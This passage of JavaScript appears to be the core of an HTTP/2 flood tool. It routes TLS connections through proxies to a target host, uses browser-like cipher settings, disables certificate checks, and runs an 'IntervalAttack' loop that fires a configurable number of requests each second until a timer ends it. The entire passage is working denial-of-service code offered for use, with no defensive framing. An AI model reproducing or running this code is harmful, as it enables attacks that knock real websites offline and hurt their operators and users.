     Header.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 25000);

         const tlsOptions = {
            ALPNProtocols: ['h2', 'http/2.0'],
            echdCurve: "GREASE:X25519:x25519",
            ciphers: "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
            rejectUnauthorized: false,
            socket: connection,
            honorCipherOrder: true,
            secure: true,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                           crypto.constants.SSL_OP_NO_TICKET |
                           crypto.constants.SSL_OP_NO_COMPRESSION |
                           crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                           crypto.constants.SSL_OP_NO_SSLv2 |
                           crypto.constants.SSL_OP_NO_SSLv3 |
                           crypto.constants.SSL_OP_NO_TLSv1 |
                           crypto.constants.SSL_OP_NO_TLSv1_1,
          };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 25000 * 30000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "http://",
             settings: {
            headerTableSize: 25000,
            maxConcurrentStreams: 25000,
            initialWindowSize: 25000 * 800000,
            maxHeaderListSize: 25000 * 25000,
            enablePush: false
          },
             maxSessionMemory: 25000,
             maxDeflateDynamicTableSize: 25000,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 25000,
            maxConcurrentStreams: 25000,
            initialWindowSize: 25000,
            maxHeaderListSize: 25000,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);